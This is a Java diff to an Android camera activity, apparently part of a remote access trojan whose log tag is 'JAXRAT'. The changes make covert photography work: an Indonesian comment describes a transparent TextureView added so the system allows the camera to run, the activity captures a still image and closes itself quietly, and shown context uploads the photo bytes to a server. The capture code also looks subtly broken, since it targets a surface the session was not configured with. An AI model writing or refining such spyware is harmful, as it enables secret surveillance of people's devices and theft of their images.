@@ -10,6 +10,8 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.util.Log;
+import android.view.Surface;
+import android.view.TextureView;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import java.io.*;
@@ -21,6 +23,7 @@ public class CameraActivity extends AppCompatActivity {
     private CameraDevice cameraDevice;
     private CameraCaptureSession captureSession;
     private ImageReader imageReader;
+    private TextureView textureView;
     private String cameraId;
     private Handler backgroundHandler;
     private HandlerThread backgroundThread;
@@ -28,7 +31,10 @@ public class CameraActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.camera_layout);
+        
+        // Bikin TextureView transparan (bukan layout XML) biar sistem ngizinin kamera jalan
+        textureView = new TextureView(this);
+        setContentView(textureView);
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             finish(); return;
@@ -36,7 +42,16 @@ public class CameraActivity extends AppCompatActivity {
 
         boolean isFront = getIntent().getBooleanExtra("FRONT", false);
         startBackgroundThread();
-        setupCamera(isFront);
+        
+        textureView.setSurfaceTextureListener(new TextureView.SurfaceTextureListener() {
+            @Override
+            public void onSurfaceTextureAvailable(android.graphics.SurfaceTexture surface, int width, int height) {
+                setupCamera(isFront);
+            }
+            @Override public void onSurfaceTextureSizeChanged(android.graphics.SurfaceTexture surface, int width, int height) {}
+            @Override public boolean onSurfaceTextureDestroyed(android.graphics.SurfaceTexture surface) { return true; }
+            @Override public void onSurfaceTextureUpdated(android.graphics.SurfaceTexture surface) {}
+        });
     }
 
     private void setupCamera(boolean isFront) {
@@ -73,28 +88,34 @@ public class CameraActivity extends AppCompatActivity {
                             takePicture();
                         }
                         @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
-                        @Override public void onError(CameraDevice camera, int error) { camera.close(); }
+                        @Override public void onError(CameraDevice camera, int error) { camera.close(); finish(); }
                     }, backgroundHandler);
                 }
-            }
+            } else { finish(); }
         } catch (Exception e) { Log.e("JAXRAT", "Camera Error", e); finish(); }
     }
 
     private void takePicture() {
         try {
-            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-            builder.addTarget(imageReader.getSurface());
-            cameraDevice.createCaptureSession(java.util.Collections.singletonList(imageReader.getSurface()), 
-                new CameraCaptureSession.StateCallback() {
-                    @Override
-                    public void onConfigured(CameraCaptureSession session) {
-                        captureSession = session;
-                        try { session.capture(builder.build(), null, backgroundHandler); } 
-                        catch (Exception e) { }
-                    }
-                    @Override public void onConfigureFailed(CameraCaptureSession session) { }
-                }, backgroundHandler);
-        } catch (Exception e) { }
+            Surface surface = new Surface(textureView.getSurfaceTexture());
+            java.util.List<Surface> surfaces = java.util.Collections.singletonList(surface);
+            
+            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+            builder.addTarget(surface);
+            
+            cameraDevice.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
+                @Override
+                public void onConfigured(CameraCaptureSession session) {
+                    captureSession = session;
+                    try {
+                        CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                        captureBuilder.addTarget(imageReader.getSurface());
+                        session.capture(captureBuilder.build(), null, backgroundHandler);
+                    } catch (Exception e) { finish(); }
+                }
+                @Override public void onConfigureFailed(CameraCaptureSession session) { finish(); }
+            }, backgroundHandler);
+        } catch (Exception e) { finish(); }
     }
 
     private void uploadImage(byte[] imageBytes) {
@@ -120,7 +141,7 @@ public class CameraActivity extends AppCompatActivity {
                 Log.d("JAXRAT", "Upload Foto Selesai: " + responseCode);
             } catch (Exception e) { Log.e("JAXRAT", "Upload Error", e); }
             
-            runOnUiThread(this::finish); // Tutup layar kamera setelah upload
+            runOnUiThread(this::finish); 
         }).start();
     }
 
